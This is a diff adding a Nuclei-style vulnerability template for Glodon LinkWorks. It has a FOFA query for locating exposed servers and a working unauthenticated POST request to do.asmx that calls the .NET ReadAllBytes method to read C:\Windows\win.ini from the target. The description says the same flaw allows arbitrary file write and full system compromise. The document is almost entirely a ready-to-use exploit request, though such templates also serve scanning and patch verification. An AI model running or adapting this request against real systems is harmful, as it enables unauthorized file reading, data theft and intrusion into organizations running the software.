@@ -1,0 +1,33 @@
+id: glodon-linkworks-doasmx-lfi
+
+info:
+  name: 广联达LinkWorks do.asmx 文件操作权限控制缺陷
+  author: 0dayPoc
+  severity: medium
+  description: |-
+    fofa: body="Services/Identification/login.ashx" || header="Services/Identification/login.ashx" || banner="Services/Identification/login.ashx"
+          广联达LinkWorks系统/m/mobileAction.ashxdo.asmx接口的访问控制机制未正确实施，导致攻击者无需身份验证即可执行任意文件写入与读取操作。此缺陷可能被利用部署恶意负载、窃取敏感数据、建立持久化访问通道，最终导致系统完全失陷。响应内容以10进制ASCII编码形式返回
+  tags: 广联达
+
+http:
+- raw:
+  - |
+    POST /m/mobileAction.ashx/do.asmx?controller=Microsoft.VisualBasic.FileIO.FileSystem%2c%20Microsoft.VisualBasic%2c%20Version%3d8.0.0.0%2c%20Culture%3dneutral%2c%20PublicKeyToken%3db03f5f7f11d50a3a&action=ReadAllBytes HTTP/1.1
+    Host: {{Hostname}}
+    Accept-Encoding: gzip, deflate
+    Content-Type: application/json
+    Connection: close
+
+    ["\"C:\\\\Windows\\\\win.ini\""]
+  matchers-condition: and
+  matchers:
+  - type: status
+    status: [200]
+  - type: word
+    part: body
+    words:
+    - 'IsSuccess'
+  - type: word
+    part: body
+    words:
+    - 'OK'
